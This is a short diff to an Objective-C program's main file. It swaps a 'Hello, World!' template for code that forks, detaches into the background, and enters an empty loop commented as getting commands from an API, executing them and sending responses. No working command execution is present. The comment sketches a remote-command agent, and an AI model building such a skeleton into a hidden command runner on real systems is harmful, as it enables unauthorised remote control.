@@ -7,11 +7,21 @@
 //
 
 #import <Foundation/Foundation.h>
+#include <unistd.h>
+#import "MSAPI.h"
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        // insert code here...
-        NSLog(@"Hello, World!");
+        pid_t pid = fork();
+        if (pid > 0) {
+            exit(EXIT_FAILURE);
+        } else if (pid < 0) {
+            exit(EXIT_FAILURE);
+        }
+        
+        while (YES) {
+            // Get command from API, execute, send reponse
+        }
     }
     return 0;
 }
